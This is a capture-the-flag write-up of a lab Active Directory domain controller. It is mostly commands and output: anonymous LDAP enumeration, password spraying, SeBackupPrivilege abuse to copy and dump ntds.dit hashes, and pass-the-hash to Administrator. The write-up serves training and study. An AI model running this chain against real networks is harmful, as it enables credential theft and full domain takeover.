# Enumeration
```bash
 sudo nmap -sC -sV <target's ip> -p- -T5                                                     
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 09:41 +0300
Nmap scan report for <target's ip>
Host is up (0.053s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-28 06:43:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-07-27T06:36:15
|_Not valid after:  2027-01-26T06:36:15
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-07-28T06:43:56+00:00
|_ssl-date: 2026-07-28T06:44:35+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
59324/tcp open  msrpc         Microsoft Windows RPC
59336/tcp open  msrpc         Microsoft Windows RPC
64440/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
64441/tcp open  msrpc         Microsoft Windows RPC
64446/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-28T06:43:56
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```


#### Findings:
1. Active Directory / Domain Controller:
	all required ports are opened
	1. DNS - 53 TCP/UDP - DNS resolution across the entire Active Directory
	2. Kerberos - 88 TCP/UDP - Authentication Protocol used in AD
	3. RPC - 135 TCP - Remote Procedure call Service  
	4. LDAP - Lightweight Directory Access Protocol 
	5. SMB - Server Message Block - online share
	6. Kerberos password change - 464 TCP/UDP
	7. LDAP GC - 3268/3269 - LDAP Global Catalog -  encrypted/unecrypted
2. Host: `BabyDC.baby.vl` / NetBIOS - `BABYDC`
3. Domain: `baby.vl` / NETBIOS - `BABY`
4. OS: Windows 10.0.20348 - Windows Server 2022

---
#### Core break down - Active Directory 
**`Active Directory`** - Microsoft implementation used for centalised system management. It performs: user authentication, locating computers by names, applies policies to users and computers, discovers abd locate services (MSSQL, DNS) and stores configuration data.  

**`Domain Controller`** -  is a server that runs Active Directory and its services, and provides authentication for the domain.

**`Lightweight Directory Access Protocol (LDAP)`** — a protocol that provides access to Active Directory's centralized database, allowing queries and modifications against objects such as: usernames, groups, distinguished names (DNs), computers, organizational units (OUs), permissions, group policies, and their attributes.

**`Offensive Vector:`** Since LDAP is often queryable, we can attempt an anonymous bind - authenticating without any credentials (empty username and password fields) - to see if the directory permits unauthenticated access. If successful we can expose priceless information, about Active Directory Structure, which could be exfiltrated and use it for the further attacks. **SERVICE IS THE PRIMARY TARGET OF ENUMERATION!**

---
Trying to login in the `SMB` using empty (guest) credentials didn't get us something. So we try anonymous login for the `LDAP`, simultaneously extracting the data about users (using NetExec).

```bash
nxc ldap  <target's ip> --users-export /home/lilith/CTF/baby/userlistnxc.txt                                       
LDAP        <target's ip>   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        <target's ip>   389    BABYDC           [*] Enumerated 9 domain users: baby.vl
LDAP        <target's ip>   389    BABYDC           -Username-                    -Last PW Set-       -BadPW-  -Description-          
LDAP        <target's ip>   389    BABYDC           Guest                         <never>             0        Built-in account for guest access to the computer/domain
LDAP        <target's ip>   389    BABYDC           Jacqueline.Barnett            2021-11-21 17:11:03 0                               
LDAP        <target's ip>   389    BABYDC           Ashley.Webb                   2021-11-21 17:11:03 0                               
LDAP        <target's ip>   389    BABYDC           Hugh.George                   2021-11-21 17:11:03 0                               
LDAP        <target's ip>   389    BABYDC           Leonard.Dyer                  2021-11-21 17:11:03 0                               
LDAP        <target's ip>   389    BABYDC           Connor.Wilkinson              2021-11-21 17:11:08 0                               
LDAP        <target's ip>   389    BABYDC           Joseph.Hughes                 2021-11-21 17:11:08 0                               
LDAP        <target's ip>   389    BABYDC           Kerry.Wilson                  2021-11-21 17:11:08 0                               
LDAP        <target's ip>   389    BABYDC           Teresa.Bell                   2021-11-21 17:14:37 0        Set initial password to BabyStart123!
LDAP        <target's ip>   389    BABYDC           [*] Writing 9 local users to /home/lilith/CTF/baby/userlistnxc.txt
```

 `Teresa.Bell` - rewarded our efforts.  **Password** - `BabyStart123!`
  

--- 
#### Other useful commands
Quering every `Active Directory` objects using NXC
```bash
nxc ldap BABYDC.baby.vl -u '' -p '' --query "(objectClass=*)" "" | grep "Response for object:"
```
Querying `Active Directory` object that has a `sAMAccountName` attribute - User Accounts; Computer Accounts (PC01$); Service Accounts
```bash
nxc ldap BABYDC.baby.vl -u '' -p '' --query "(sAMAccountName=*)" ""
```
---

For being confident we also try to exfiltrate all possible DNs (distinguished names) and apply some commands to satisfy login requirements
```bash
ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://BabyDC.baby.vl  | awk -F ': ' '/^dn:/{print $2}' | cut -d "=" -f2  | tail -11 | cut -d "," -f1 | tr " " "." >> CTF/baby/userlistnxc.txt 

cat userlistnxc.txt                                                     
Guest
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Jacqueline.Barnett
Ashley.Webb
Hugh.George
Leonard.Dyer
Ian.Walker
it
Connor.Wilkinson
Joseph.Hughes
Kerry.Wilson
Teresa.Bell
Caroline.Robinson
```
---
#### Core break down - Active Directory (DNs)
**`Distinguished names (DNs)`** - unique identifier of an objects and its exact location within LDAP and Active Directory and includes next components:

| Prefix | Meaning                                                     | Example            |
| ------ | ----------------------------------------------------------- | ------------------ |
| `CN`   | Common Name                                                 | `CN=Administrator` |
| `OU`   | Organizational Unit                                         | `OU=IT`            |
| `DC`   | Domain Component                                            | `DC=baby,DC=vl`    |
| `OU`   | Folder-like container                                       | `OU=Servers`       |
| `CN`   | Can also represent objects like groups, computers, policies | `CN=Domain Admins` |

**`ldapsearch`** - tool used for query LDAP (could be easily replaces with NXC)
```bash
ldapsearch -x   # use simple authentication
	-b          # Base DN specification (tree starting point)
	"*"         # shorthand of (objectClass=*) (means match every object)
	-H ldap://  # connect to..
```

---

# Password Spraying - Foothold
Since we have a password and a list of users, we can perform `Password Spraying` technique, where we try one password for each user 
```bash
nxc ldap  <target's ip> -u userlistnxc.txt -p 'BabyStart123!'                              
LDAP        <target's ip>   389    BABYDC           [*] Windows Server 2022 Build 20348 (name:BABYDC) (domain:baby.vl) (signing:None) (channel binding:No TLS cert)
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Guest:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Jacqueline.Barnett:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Ashley.Webb:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Hugh.George:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Leonard.Dyer:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Ian.Walker:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\it:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Connor.Wilkinson:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Joseph.Hughes:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Kerry.Wilson:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Teresa.Bell:BabyStart123! 
LDAP        <target's ip>   389    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE
```
We found the username `Caroline.Robinson` and the password status `STATUS_PASSWORD_MUST_CHANGE`!
In this case we must change password, otherwise account won't function properly.

```bash
netexec smb BABYDC.baby.vl -u Caroline.Robinson -p password.... --pass-pol     # checking password policy of the Domain Controller
```
```bash
nxc smb  <target's ip> -u 'Caroline.Robinson' -p 'BabyStart123!' -M change-password -o NEWPASS='password123!!!'
SMB         <target's ip>   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         <target's ip>   445    BABYDC           [-] baby.vl\Caroline.Robinson:BabyStart123! STATUS_PASSWORD_MUST_CHANGE 
CHANGE-P... <target's ip>   445    BABYDC           [+] Successfully changed password for Caroline.Robinson
```
---
#### Why  SMB is used for password changing ?
**`LDAP`** `(Additional Information)` - essentially protocol is mainly used as directory services for searching users, reading attributes, authentication and modifying directory objects. However, **it provides password changing mechanism**, but the requirements are very severe: LDAP over SSL/TLS; special encoding; sufficient permissions.

**Offensive side:** to facilitate and fulfill this conditions many offensive tools use password changing via **`SAMR`** `(Security Account Manager Remote protocol` (used for managing password, user accounts, local groups and databases and runs **OVER SMB**),  because Windows exposes password management functions through RPC services over SMB. 

---

We successfully log in using our new password and user found before.
```bash
evil-winrm-py -i <target's ip> -u 'Caroline.Robinson' -p 'password123!!!'                             
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '<target's ip>:5985' as 'Caroline.Robinson'
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> dir
```

```powershell
C:\Users\Caroline.Robinson\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```
Core privileges:
	1. SeRestorePrivilege
	2. SeBackupPrivilege


---
# Privilege Escalation 
#### Core break down - Privilege Escalation Vector - SeBackupPrivilege (Dumping SAM)
Interesting and useful links:
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/tree/master
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/tree/master/Notes

**`SeBackupPrivilege`** - privilege, which allows user to read files and directories, in addition to creating backups, **regardless** their security policies. **NORMALLY NOT GRANTED FOR THE USERS!**  

Technique Scenario: 
	1. Copy and Download `SAM` hive of `HKLM` to the directory with the writing permissions
	2. Copy and Download `SYSTEM` hive of `HKLM` to the directory with the writing permissions
	3. Using `impacket-secretdump` dump all hashed inside.

**`Security Account Manager (SAM)`** hive - a part of the Windows registry, which **stores all information about *local accounts*** - usernames, security identifiers (SIDs), group memberships, and password hashes (NTLM hashes, stored as LM/NT hash pairs depending on configuration)

**`SYSTEM`** hive - basically stores the hardware and system configuration data. **Critically**: stores **boot key** (`sys key`), which is used to **encrypt and decrypt password hashes** stored in the **`SAM`**. 

**`SeRestorePrivilege`** - bypasses **write** security controls to modify, overwrite, or **replace any files or system object**

---
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> reg save hklm\sam sam.hive
The operation completed successfully.    # saving sam.hive
```
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> reg save hklm\system system.hive
The operation completed successfully.    # saving system.hive
```

```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download sam.hive ~/
Downloading C:\Users\Caroline.Robinson\Documents\sam.hive: 64.0kB [00:00, 285MB/s]                                                    
[+] File downloaded successfully and saved as: /home/lilith/sam.hive

evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download system.hive ~/
Downloading C:\Users\Caroline.Robinson\Documents\system.hive: 19.6MB [00:23, 857kB/s]                                                 
[+] File downloaded successfully and saved as: /home/lilith/system.hive
```
##### impacket secretsdump.py 
**`secretsdump.py`** - uses boot key (sys key) for decrypt and extract passwords and usernames from the `SAM` and `LSA` (Local Security Authority). 
***Process chain:***
`Boot key` - decrypts `SAM` key, then `SAM` key decrypts each user's hash.

```bash
sudo secretsdump.py -sam sam.hive -system system.hive LOCAL                                  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d992faed38128ae85e95fa35868bb43:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up...
```
However we have failed. 
```bash
nxc smb BABYDC.baby.vl -u Administrator -H 8d992faed38128ae85e95fa35868bb43 
SMB <ip> 445 BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:False) (Null Auth:True) 
SMB 10.129.20.55 445 BABYDC   [-] baby.vl\Administrator:8d992faed38128ae85e95fa35868bb43 STATUS_LOGON_FAILURE
```

---
#### Core break down - Privilege Escalation Vector -  SeBackupPrivilege (Dumping Domain Hashes)

If SAM hashes didn't give us any necessary credentials, we can try to dump the entire Active Directory's database, which contains information about its objects.

**`NTDS.dit`** - file, which contains domain hashes, and can be decrypt using `SYSTEM boot key` mentioned above. However, this file is locked and we are unable to copy it. For this purpose we will create a snapshot (shadow copy) of the drive using `diskshadow` (windows implementation for creating snapshots) with the script seen below. 

**IMPORTANT!** We are able to doing this only due to our current privileges `SeRestorePrivilege` (bypasses write security policies) `SeBackupPrivilege` (allows us create the backups).

---
```bash
 cat backup                                                         
set verbose on                              # detailed output
set metadata C:\Windows\Temp\test.cab       # save all metadata (initial properties)
set context persistent                      # persistent mean - copy will survive a reboot;                                                it won't be automaticaly clean up
add volume C: alias cdrive                  # createas and alias for C:
create
expose %cdrive% E:                          # takes the shadowcopy of the cdrive (C's allias)



unix2dos backup                             # converts unix format to the windows suitable
```

Transmitting file using local web-server:
```bash 
python3 -m http.server 9001  
```
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> wget http://10.10.15.39:9001/backup -OutFile backup -UseBasicParsing # -UseBasicParsing for skipping HTML/DOM fetching by the  Internet Exproler 
```
Transmitting using `evil-winrm`:
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> upload /home/lilith/backup .
Uploading /home/lilith/backup.txt: 100%|███████████████████████████████████████████████████████████████| 129/129 [00:00<00:00, 743B/s]
[+] File uploaded successfully as: C:\Users\Caroline.Robinson\Documents\backup.txt
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> ls


    Directory: C:\Users\Caroline.Robinson\Documents


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                                                                               
-a----         7/28/2026   7:27 AM            129 backup                                                                                                                              
-a----         7/28/2026   7:17 AM          49152 sam.hive                                                              
-a----         7/28/2026   7:17 AM       20480000 system.hive                                                           
```
Now we just ran `diskshadow` /s for creating frozen-zone (snapshot) and specifying script (shadow copy parameters) 
```bash

evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> diskshadow /s ./backup
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  BABYDC,  7/28/2026 7:40:01 AM

-> set verbose on                             
-> set metadata C:\Windows\Temp\test.cab
-> set context persistent
-> add volume C: alias cdrive
-> create
Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.

* Including writer "Task Scheduler Writer":
	+ Adding component: \TasksStore

* Including writer "VSS Metadata Store Writer":
	+ Adding component: \WriterMetadataStore

* Including writer "Performance Counters Writer":
	+ Adding component: \PerformanceCounters

* Including writer "System Writer":
	+ Adding component: \System Files
	+ Adding component: \Win32 Services Files

* Including writer "ASR Writer":
	+ Adding component: \ASR\ASR
	+ Adding component: \Volumes\Volume{711fc68a-0000-0000-0000-100000000000}
	+ Adding component: \Disks\harddisk0
	+ Adding component: \BCD\BCD

* Including writer "Registry Writer":
	+ Adding component: \Registry

* Including writer "DFS Replication service writer":
	+ Adding component: \SYSVOL\8D6E7361-AC28-4EC5-9914-ACB6AE407BCB-2EB58465-8BD4-4748-9135-FE1B23D5A20B

* Including writer "WMI Writer":
	+ Adding component: \WMI

* Including writer "NTDS":
	+ Adding component: \C:_Windows_NTDS\ntds

* Including writer "COM+ REGDB Writer":
	+ Adding component: \COM+ REGDB

Alias cdrive for shadow ID {ce0a0294-017f-4b40-bcd3-6bd97622fd1e} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {0aea75e7-fb06-4bb4-8d87-fb2bd1b80d51} set as environment variable.
Inserted file Manifest.xml into .cab file test.cab
Inserted file BCDocument.xml into .cab file test.cab
Inserted file WM0.xml into .cab file test.cab
Inserted file WM1.xml into .cab file test.cab
Inserted file WM2.xml into .cab file test.cab
Inserted file WM3.xml into .cab file test.cab
Inserted file WM4.xml into .cab file test.cab
Inserted file WM5.xml into .cab file test.cab
Inserted file WM6.xml into .cab file test.cab
Inserted file WM7.xml into .cab file test.cab
Inserted file WM8.xml into .cab file test.cab
Inserted file WM9.xml into .cab file test.cab
Inserted file WM10.xml into .cab file test.cab
Inserted file DisD0DD.tmp into .cab file test.cab

Querying all shadow copies with the shadow copy set ID {0aea75e7-fb06-4bb4-8d87-fb2bd1b80d51}

	* Shadow copy ID = {ce0a0294-017f-4b40-bcd3-6bd97622fd1e}		%cdrive%
		- Shadow copy set: {0aea75e7-fb06-4bb4-8d87-fb2bd1b80d51}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{711fc68a-0000-0000-0000-100000000000}\ [C:\]
		- Creation time: 7/28/2026 7:40:49 AM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: BabyDC.baby.vl
		- Service machine: BabyDC.baby.vl
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent Differential

Number of shadow copies listed: 1
-> expose %cdrive% E:
-> %cdrive% = {ce0a0294-017f-4b40-bcd3-6bd97622fd1e}
The shadow copy was successfully exposed as E:\.
-> 
```
---
#### Breaking down - robocopy /b
Congratulations! We created shadow copy of the entire C drive saving all its properties. Now we can use `robocopy` with the `/b` switch to copy domain hashed database - `ntds.dit` from `E:\Windows\NTDS .`

`robobocopy` - powerfull tool for copying large amounts of data. `/b` switch enables **backup mode**, which bypass file and folder permission setting (Access Control Lists (ACLs)).  

**This is possible only due to our previous investigated permissions..**

---

 
```bash
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> robocopy /b E:\Windows\NTDS . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows                              
-------------------------------------------------------------------------------

  Started : Tuesday, July 28, 2026 7:45:11 AM
   Source : E:\Windows\NTDS\
     Dest : C:\Users\Caroline.Robinson\Documents\

    Files : ntds.dit
	   
  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30 

------------------------------------------------------------------------------

	                  1	E:\Windows\NTDS\
	   New File  		 16.0 m	ntds.dit
	   
...

```
Then, after successful copying we just download it to our localmachine 
```powershell
evil-winrm-py PS C:\Users\Caroline.Robinson\Documents> download ntds.dit .
Downloading C:\Users\Caroline.Robinson\Documents\ntds.dit: 100%|█████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 16.0M/16.0M [00:15<00:00, 1.11MB/s]
[+] File downloaded successfully and saved as: /home/lilith/ntds.dit
```
Same stuff, same actions - **BUT!** Now we are working with the priceless target - domain hashes.
```bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL                               
Impacket v0.14.0.dev0+20260611.171053.546f7acc - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:3d538eabff6633b62dbaa5fb5ade3b4d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:16f0eaee49dd7c3487a0d27924346fbe:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:1a7d22edfaf3a8083f96a0270da971b4a42822181db117cf98c68c8f76bcf192
BABYDC$:aes128-cts-hmac-sha1-96:406b057cd3a92a9cc719f23b0821a45b
BABYDC$:des-cbc-md5:8fef68979223d645
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:
```

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1e3fbd764e33d9cef123d:::`, where `ee4457ae59f1e3fbd764e33d9cef123d` is the Administator's hash!

# Access (permissions) confirmation 

Confirming our credential using SMB (unnecesary)
```bash
nxc smb BABYDC.baby.vl -u 'Administrator' -H ee4457ae59f1e3fbd764e33d9cef123d                                     
 
SMB         <target's ip>   445    BABYDC           [*] Windows Server 2022 Build 20348 x64 (name:BABYDC) (domain:baby.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         <target's ip>   445    BABYDC           [+] baby.vl\Administrator:ee4457ae59f1e3fbd764e33d9cef123d (Pwn3d!)
```

Final log in!
```powershell
evil-winrm-py -i <target's ip> -u 'Administrator' -H ee4457ae59f1e3fbd764e33d9cef123d
evil-winrm-py PS C:\Users\Administrator\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled


evil-winrm-py PS C:\Users\Administrator\Documents> whoami
baby\administrator
```
